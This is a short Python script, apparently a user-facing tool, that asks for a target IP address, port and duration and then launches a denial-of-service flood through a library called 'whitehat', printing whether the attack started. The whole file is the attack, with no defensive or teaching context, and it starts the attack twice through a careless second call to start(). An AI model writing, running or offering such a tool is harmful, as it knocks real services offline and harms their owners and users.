import whitehat

ipaddr = str(input("Enter IP address you want to DDOS >> "))
p = int(input("Enter port you want to use for your attack >> "))
time = int(input("Enter the amount of seconds you want to attack >> "))



ddos = whitehat.DDoS(IP=ipaddr, PORT=p, duration=time)
ddos.start()

if ddos.start() == True:
    print("DDOS Has Started")
else:
    print("Unable to connect to Target")